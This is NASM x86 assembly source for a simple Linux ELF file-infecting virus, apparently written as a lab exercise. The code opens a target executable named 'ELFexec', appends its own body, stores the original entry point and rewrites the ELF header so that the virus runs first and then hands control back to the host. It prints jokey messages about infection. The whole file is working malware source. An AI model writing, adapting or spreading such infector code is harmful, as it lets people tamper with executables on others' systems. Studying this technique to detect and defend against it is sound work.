%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro print 3
	call get_my_loc  ; get run time possition of anchor
	add edx, (%2 - anchor)  ; calculate runtime possition of Outstr
	mov eax, edx
	write %1, eax, %3 ; write to srdout
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define PREM_RW_ALL 0777
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define STDOUT 1
%define STDERR 2
%define OutStr_SIZE 47
%define ErrOpen_SIZE 132
%define ErrClose_SIZE 20
%define ErrRead_SIZE 25
%define ErrWrite_SIZE 23
%define ErrElf_SIZE 23
%define ELFH_SIZE 52
%define EntryPoint_Offset 24
%define ELFexec_VirAdress 0x08048000
%define FD [ebp-4]
%define FILE_SIZE [ebp-8]
%define VIRUS_SIZE [ebp-12]
%define BUF [ebp-STK_RES]
	global _start

section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

; print message
print STDOUT, OutStr, OutStr_SIZE

; open file
call get_my_loc  ; get run time possition of anchor
add edx, FileName - anchor	; calculate runtime possition of FileName
mov eax, edx
open eax, RDWR, PREM_RW_ALL ; write to srdout
cmp eax, 0
jl Err_Open	; if there was an error opening the file printberror and exit
mov FD, eax ; save fd on stack (at [ebp-4])

; check ELF format
lea ecx, BUF	; use stack ass buffer
read eax, ecx, 4	; read 4 bytes from file
cmp eax, 4
jl Err_Read
cmp dword BUF, 0x464c457f	; compare to ELF magic numbers
jne Err_Elf	; if the file is not in elf format print error and exit

; seek to end of file and get file size
mov ebx, FD
lseek ebx, 0, SEEK_SET ; seek to sart of file
lseek ebx, 0, SEEK_END ; seek to end of file
mov FILE_SIZE, eax ; save file size on stak (at [ebp-8])

; get virus size
mov eax, 0
add eax, (virus_end - _start)
mov VIRUS_SIZE, eax	;	save virus size on stack (at [ebp-12])

; write virus to end of file
call get_my_loc
sub edx, (anchor - _start)
mov ecx, edx
mov eax, VIRUS_SIZE
write ebx, ecx, eax
cmp eax, VIRUS_SIZE
jl Err_Write

; copy files elf header to stack
lseek ebx, 0, SEEK_SET ; seek to sart of file
lea ecx, BUF
read ebx, ecx, ELFH_SIZE
cmp eax, ELFH_SIZE
jl Err_Read

; save original entry opint under PreviousEntryPoint at the viruses copy in the file
lseek ebx, -4, SEEK_END ; seek to PreviousEntryPoint decleration at the copy of virus in the file
lea ecx, BUF ; get pointer to mapped elf header
add ecx, EntryPoint_Offset ; get pointer to entry point in mapped elf header
write ebx, ecx, 4  ; save original entry opint under PreviousEntryPoint at the viruses copy in the file
cmp eax, 4
jl Err_Write

; chenge entry point to the virus code (at runtime) in the mapped elf headers
mov eax, FILE_SIZE
add eax, ELFexec_VirAdress ; get start of virus code at ELFexecs execution
mov dword [ecx], eax ; update entry opint in mapped elf header

; write modified elf header back to file
lseek ebx, 0, SEEK_SET ; seek to sart of file
lea ecx, BUF
write ebx, ecx, ELFH_SIZE
cmp eax, ELFH_SIZE
jl Err_Write

;close file
close ebx
cmp eax, 0
jl Err_Close

; resume Infected program or exit
resume_infected:
call get_my_loc
add edx, (PreviousEntryPoint - anchor)
mov eax, dword [edx]
jmp eax

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

; print open error and exit
Err_Open:
	print STDERR, ErrOpen, ErrOpen_SIZE
	jmp resume_infected
	exit 1

; print open error and exit
Err_Close:
	print STDERR, ErrClose, ErrClose_SIZE
	exit 1 ; exit with exit code 1

; print open error and exit
Err_Read:
	print STDERR, ErrRead, ErrRead_SIZE
	exit 1 ; exit with exit code 1

; print open error and exit
Err_Write:
	print STDERR, ErrWrite, ErrWrite_SIZE
	exit 1 ; exit with exit code 1

; print error elf and exit
Err_Elf:
	print STDERR, ErrElf, ErrElf_SIZE
	exit 1 ; exit with exit code 1

get_my_loc:
	call anchor
anchor: pop edx
	ret

FileName:	db "ELFexec", 0
OutStr:		db "Is it just me, or did you just get infected?!", 10, 0
Failstr:  db "perhaps not", 10, 0
ErrOpen: 	db "Sorry cant open this file because I am probobly running in it right now!", 10,"Wow Inception...",10,"So Ill just resume the infected program.",10,0
ErrClose: db "Error opening file", 10, 0
ErrRead: db "Error reading from file", 10, 0
ErrWrite: db "Error writing to file", 10, 0
ErrElf: 	db "Error not an ELF file", 10, 0
PreviousEntryPoint: dd VirusExit
virus_end:
